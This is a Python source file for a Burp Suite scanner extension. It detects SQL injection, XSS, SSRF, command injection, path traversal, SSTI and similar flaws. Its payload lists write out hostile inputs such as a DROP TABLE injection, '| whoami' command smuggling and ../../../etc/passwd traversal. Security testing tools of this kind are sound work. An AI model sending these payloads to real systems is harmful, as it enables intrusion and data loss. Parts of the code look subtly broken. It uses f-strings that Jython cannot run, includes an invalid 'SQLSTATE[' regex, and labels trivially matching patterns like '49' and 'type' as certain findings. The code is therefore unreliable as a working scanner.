#!/usr/bin/env python3
"""
Burp Suite Extension for Advanced Vulnerability Detection
Custom extension with workflow automation capabilities
"""

from burp import IBurpExtender, IScannerCheck, ITab
from java.io import PrintWriter
from java.util import ArrayList
from java.net import URL
import json
import re
import base64
import hashlib
import time
from datetime import datetime

class BurpExtender(IBurpExtender, IScannerCheck, ITab):
    """
    Main Burp Suite Extension Class
    Provides advanced vulnerability detection and workflow automation
    """
    
    def registerExtenderCallbacks(self, callbacks):
        """Register the extension with Burp Suite"""
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        
        # Set extension name
        callbacks.setExtensionName("Advanced Vulnerability Scanner")
        
        # Register as scanner check
        callbacks.registerScannerCheck(self)
        
        # Register as tab
        callbacks.addSuiteTab(self)
        
        # Get stdout and stderr
        self._stdout = PrintWriter(callbacks.getStdout(), True)
        self._stderr = PrintWriter(callbacks.getStderr(), True)
        
        # Initialize vulnerability patterns
        self.init_vulnerability_patterns()
        
        self._stdout.println("Advanced Vulnerability Scanner Extension loaded successfully!")
    
    def init_vulnerability_patterns(self):
        """Initialize vulnerability detection patterns"""
        self.vulnerability_patterns = {
            'sql_injection': {
                'name': 'SQL Injection',
                'severity': 'High',
                'confidence': 'Certain',
                'patterns': [
                    r'sql syntax',
                    r'mysql_fetch_array',
                    r'ORA-',
                    r'PostgreSQL',
                    r'SQLite',
                    r'Microsoft OLE DB Provider',
                    r'mysql_num_rows',
                    r'mysql_fetch_assoc',
                    r'mysql_fetch_object',
                    r'mysql_fetch_row',
                    r'mysql_fetch_field',
                    r'mysql_num_fields',
                    r'mysql_list_dbs',
                    r'mysql_list_tables',
                    r'mysql_list_fields',
                    r'SQLSTATE[',
                    r'mysql error',
                    r'sql error',
                    r'database error'
                ]
            },
            'xss': {
                'name': 'Cross-Site Scripting (XSS)',
                'severity': 'High',
                'confidence': 'Certain',
                'patterns': [
                    r'<script>alert\("XSS"\)</script>',
                    r'<img src=x onerror=alert\("XSS"\)>',
                    r'javascript:alert\("XSS"\)',
                    r'<svg onload=alert\("XSS"\)>',
                    r'<iframe src="javascript:alert\(\'XSS\'\)"></iframe>',
                    r'<body onload=alert\("XSS"\)>',
                    r'<input onfocus=alert\("XSS"\) autofocus>'
                ]
            },
            'ssrf': {
                'name': 'Server-Side Request Forgery (SSRF)',
                'severity': 'High',
                'confidence': 'Certain',
                'patterns': [
                    r'connection refused',
                    r'connection timeout',
                    r'no route to host',
                    r'network is unreachable',
                    r'connection reset',
                    r'host unreachable'
                ]
            },
            'xxe': {
                'name': 'XML External Entity (XXE)',
                'severity': 'Critical',
                'confidence': 'Certain',
                'patterns': [
                    r'root:x:0:0',
                    r'127\.0\.0\.1',
                    r'localhost',
                    r'Microsoft Windows',
                    r'SYSTEM',
                    r'Administrator'
                ]
            },
            'command_injection': {
                'name': 'Command Injection',
                'severity': 'Critical',
                'confidence': 'Certain',
                'patterns': [
                    r'uid=',
                    r'gid=',
                    r'root:x:0:0',
                    r'Active Connections',
                    r'Proto Recv-Q Send-Q',
                    r'PING 127\.0\.0\.1',
                    r'Microsoft Windows',
                    r'Directory of',
                    r'Volume Serial Number'
                ]
            },
            'path_traversal': {
                'name': 'Path Traversal',
                'severity': 'High',
                'confidence': 'Certain',
                'patterns': [
                    r'root:x:0:0',
                    r'127\.0\.0\.1',
                    r'localhost',
                    r'Microsoft Windows',
                    r'SYSTEM',
                    r'Administrator',
                    r'Volume Serial Number'
                ]
            },
            'jwt_vulnerabilities': {
                'name': 'JWT Token Vulnerability',
                'severity': 'High',
                'confidence': 'Certain',
                'patterns': [
                    r'invalid signature',
                    r'algorithm not allowed',
                    r'jwt decode error',
                    r'signature verification failed',
                    r'jwt malformed',
                    r'jwt expired'
                ]
            },
            'graphql_vulnerabilities': {
                'name': 'GraphQL Vulnerability',
                'severity': 'Medium',
                'confidence': 'Certain',
                'patterns': [
                    r'__schema',
                    r'__type',
                    r'Query',
                    r'Mutation',
                    r'Subscription',
                    r'type',
                    r'fields',
                    r'args'
                ]
            },
            'deserialization': {
                'name': 'Deserialization Vulnerability',
                'severity': 'Critical',
                'confidence': 'Certain',
                'patterns': [
                    r'java\.io',
                    r'com\.sun',
                    r'org\.apache',
                    r'SerializationException',
                    r'ObjectInputStream',
                    r'readObject',
                    r'ClassNotFoundException'
                ]
            },
            'prototype_pollution': {
                'name': 'Prototype Pollution',
                'severity': 'High',
                'confidence': 'Certain',
                'patterns': [
                    r'__proto__',
                    r'constructor',
                    r'prototype',
                    r'Object\.prototype'
                ]
            },
            'ssti': {
                'name': 'Server-Side Template Injection',
                'severity': 'Critical',
                'confidence': 'Certain',
                'patterns': [
                    r'49',
                    r'7\*7',
                    r'root:x:0:0',
                    r'uid=',
                    r'gid=',
                    r'{{7\*7}}',
                    r'\$\{7\*7\}',
                    r'#\{7\*7\}'
                ]
            }
        }
    
    def doPassiveScan(self, baseRequestResponse):
        """Perform passive scanning"""
        issues = ArrayList()
        
        # Get request and response
        request = baseRequestResponse.getRequest()
        response = baseRequestResponse.getResponse()
        
        # Convert to string for analysis
        request_str = self._helpers.bytesToString(request)
        response_str = self._helpers.bytesToString(response)
        
        # Analyze for vulnerabilities
        for vuln_type, vuln_info in self.vulnerability_patterns.items():
            for pattern in vuln_info['patterns']:
                if re.search(pattern, response_str, re.IGNORECASE):
                    # Create issue
                    issue = self.create_issue(
                        baseRequestResponse,
                        vuln_info['name'],
                        vuln_info['severity'],
                        vuln_info['confidence'],
                        f"Detected {vuln_info['name']} vulnerability. Pattern: {pattern}",
                        f"The response contains evidence of a {vuln_info['name']} vulnerability. "
                        f"Pattern '{pattern}' was found in the response body."
                    )
                    issues.add(issue)
                    break
        
        return issues
    
    def doActiveScan(self, baseRequestResponse, insertionPoint):
        """Perform active scanning"""
        issues = ArrayList()
        
        # Get base request and response
        base_request = baseRequestResponse.getRequest()
        base_response = baseRequestResponse.getResponse()
        
        # Define payloads for different vulnerability types
        payloads = self.get_active_scan_payloads()
        
        # Test each payload
        for payload_info in payloads:
            payload = payload_info['payload']
            vuln_type = payload_info['type']
            
            # Create payload request
            checkRequest = insertionPoint.buildRequest(payload)
            
            # Send request
            checkResponse = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(),
                checkRequest
            )
            
            # Analyze response
            response_str = self._helpers.bytesToString(checkResponse.getResponse())
            
            # Check for vulnerability indicators
            if self.detect_vulnerability(response_str, vuln_type):
                issue = self.create_issue(
                    checkResponse,
                    f"{vuln_type} - Active Scan",
                    "High",
                    "Certain",
                    f"Active scan detected {vuln_type} vulnerability",
                    f"The application is vulnerable to {vuln_type}. "
                    f"Payload: {payload}"
                )
                issues.add(issue)
        
        return issues
    
    def get_active_scan_payloads(self):
        """Get payloads for active scanning"""
        return [
            # SQL Injection payloads
            {'type': 'SQL Injection', 'payload': "' OR '1'='1"},
            {'type': 'SQL Injection', 'payload': "' UNION SELECT NULL--"},
            {'type': 'SQL Injection', 'payload': "'; DROP TABLE users--"},
            {'type': 'SQL Injection', 'payload': "' OR 1=1#"},
            
            # XSS payloads
            {'type': 'XSS', 'payload': '<script>alert("XSS")</script>'},
            {'type': 'XSS', 'payload': '<img src=x onerror=alert("XSS")>'},
            {'type': 'XSS', 'payload': '"><script>alert("XSS")</script>'},
            
            # SSRF payloads
            {'type': 'SSRF', 'payload': 'http://localhost'},
            {'type': 'SSRF', 'payload': 'http://127.0.0.1'},
            {'type': 'SSRF', 'payload': 'file:///etc/passwd'},
            
            # Command Injection payloads
            {'type': 'Command Injection', 'payload': '; ls -la'},
            {'type': 'Command Injection', 'payload': '| whoami'},
            {'type': 'Command Injection', 'payload': '& dir'},
            
            # Path Traversal payloads
            {'type': 'Path Traversal', 'payload': '../../../etc/passwd'},
            {'type': 'Path Traversal', 'payload': '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'},
            
            # JWT payloads
            {'type': 'JWT Vulnerability', 'payload': 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.'},
            
            # GraphQL payloads
            {'type': 'GraphQL Vulnerability', 'payload': '{"query": "query { __schema { types { name } } }"}'},
            
            # SSTI payloads
            {'type': 'SSTI', 'payload': '{{7*7}}'},
            {'type': 'SSTI', 'payload': '${7*7}'},
            {'type': 'SSTI', 'payload': '#{7*7}'},
            
            # Prototype Pollution payloads
            {'type': 'Prototype Pollution', 'payload': '{"__proto__": {"isAdmin": true}}'},
            
            # Deserialization payloads
            {'type': 'Deserialization', 'payload': '{"rce": "java.io.ObjectInputStream"}'}
        ]
    
    def detect_vulnerability(self, response_str, vuln_type):
        """Detect vulnerability in response"""
        if vuln_type == 'SQL Injection':
            patterns = self.vulnerability_patterns['sql_injection']['patterns']
        elif vuln_type == 'XSS':
            patterns = self.vulnerability_patterns['xss']['patterns']
        elif vuln_type == 'SSRF':
            patterns = self.vulnerability_patterns['ssrf']['patterns']
        elif vuln_type == 'Command Injection':
            patterns = self.vulnerability_patterns['command_injection']['patterns']
        elif vuln_type == 'Path Traversal':
            patterns = self.vulnerability_patterns['path_traversal']['patterns']
        elif vuln_type == 'JWT Vulnerability':
            patterns = self.vulnerability_patterns['jwt_vulnerabilities']['patterns']
        elif vuln_type == 'GraphQL Vulnerability':
            patterns = self.vulnerability_patterns['graphql_vulnerabilities']['patterns']
        elif vuln_type == 'SSTI':
            patterns = self.vulnerability_patterns['ssti']['patterns']
        elif vuln_type == 'Prototype Pollution':
            patterns = self.vulnerability_patterns['prototype_pollution']['patterns']
        elif vuln_type == 'Deserialization':
            patterns = self.vulnerability_patterns['deserialization']['patterns']
        else:
            return False
        
        for pattern in patterns:
            if re.search(pattern, response_str, re.IGNORECASE):
                return True
        
        return False
    
    def create_issue(self, requestResponse, name, severity, confidence, detail, background):
        """Create a Burp issue"""
        from burp import IScanIssue
        
        class CustomScanIssue(IScanIssue):
            def __init__(self, httpService, url, httpMessages, name, detail, severity, confidence, background):
                self._httpService = httpService
                self._url = url
                self._httpMessages = httpMessages
                self._name = name
                self._detail = detail
                self._severity = severity
                self._confidence = confidence
                self._background = background
            
            def getUrl(self):
                return self._url
            
            def getIssueName(self):
                return self._name
            
            def getIssueType(self):
                return 0
            
            def getSeverity(self):
                return self._severity
            
            def getConfidence(self):
                return self._confidence
            
            def getIssueBackground(self):
                return self._background
            
            def getRemediationBackground(self):
                return ""
            
            def getIssueDetail(self):
                return self._detail
            
            def getRemediationDetail(self):
                return ""
            
            def getHttpMessages(self):
                return self._httpMessages
            
            def getHttpService(self):
                return self._httpService
        
        return CustomScanIssue(
            requestResponse.getHttpService(),
            self._helpers.analyzeRequest(requestResponse).getUrl(),
            [requestResponse],
            name,
            detail,
            severity,
            confidence,
            background
        )
    
    def getTabCaption(self):
        """Get tab caption"""
        return "Advanced Scanner"
    
    def getUiComponent(self):
        """Get UI component"""
        from javax.swing import JPanel, JTextArea, JScrollPane, JButton, JLabel
        from java.awt import BorderLayout, FlowLayout
        from javax.swing import BoxLayout
        
        # Create main panel
        panel = JPanel()
        panel.setLayout(BorderLayout())
        
        # Create title
        title = JLabel("Advanced Vulnerability Scanner")
        title.setFont(title.getFont().deriveFont(16.0))
        panel.add(title, BorderLayout.NORTH)
        
        # Create content panel
        content_panel = JPanel()
        content_panel.setLayout(BoxLayout(content_panel, BoxLayout.Y_AXIS))
        
        # Add status label
        status_label = JLabel("Extension Status: Active")
        content_panel.add(status_label)
        
        # Add info text area
        info_text = JTextArea()
        info_text.setText("""
Advanced Vulnerability Scanner Extension

Features:
- SQL Injection Detection
- XSS Detection  
- SSRF Detection
- XXE Detection
- Command Injection Detection
- Path Traversal Detection
- JWT Vulnerability Detection
- GraphQL Vulnerability Detection
- SSTI Detection
- Prototype Pollution Detection
- Deserialization Detection

The extension automatically scans for these vulnerabilities
during both passive and active scanning phases.
        """)
        info_text.setEditable(False)
        info_text.setLineWrap(True)
        info_text.setWrapStyleWord(True)
        
        scroll_pane = JScrollPane(info_text)
        content_panel.add(scroll_pane)
        
        panel.add(content_panel, BorderLayout.CENTER)
        
        return panel
    
    def reportScanIssue(self, issue):
        """Report scan issue"""
        self._callbacks.addScanIssue(issue)

# Additional utility classes for workflow automation

class WorkflowAutomation:
    """Workflow automation utilities"""
    
    def __init__(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
    
    def automate_scan_workflow(self, target_url):
        """Automate complete scan workflow"""
        # 1. Spider the site
        self.spider_site(target_url)
        
        # 2. Run active scan
        self.run_active_scan(target_url)
        
        # 3. Generate report
        self.generate_report(target_url)
    
    def spider_site(self, target_url):
        """Automate site crawling"""
        # Implementation for automated crawling
        pass
    
    def run_active_scan(self, target_url):
        """Automate active scanning"""
        # Implementation for automated active scanning
        pass
    
    def generate_report(self, target_url):
        """Generate comprehensive report"""
        # Implementation for report generation
        pass

class CustomPayloadGenerator:
    """Generate custom payloads for testing"""
    
    @staticmethod
    def generate_sql_payloads():
        """Generate SQL injection payloads"""
        return [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 1=1#",
            "' UNION SELECT @@version--",
            "admin'--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
        ]
    
    @staticmethod
    def generate_xss_payloads():
        """Generate XSS payloads"""
        return [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '<svg onload=alert("XSS")>'
        ]
    
    @staticmethod
    def generate_ssrf_payloads():
        """Generate SSRF payloads"""
        return [
            'http://localhost',
            'http://127.0.0.1',
            'http://0.0.0.0',
            'file:///etc/passwd',
            'dict://localhost:11211/stat'
        ]

# Example usage and testing
if __name__ == "__main__":
    print("Burp Suite Extension - Advanced Vulnerability Scanner")
    print("This extension provides:")
    print("- Advanced vulnerability detection")
    print("- Workflow automation")
    print("- Custom payload generation")
    print("- Comprehensive reporting") 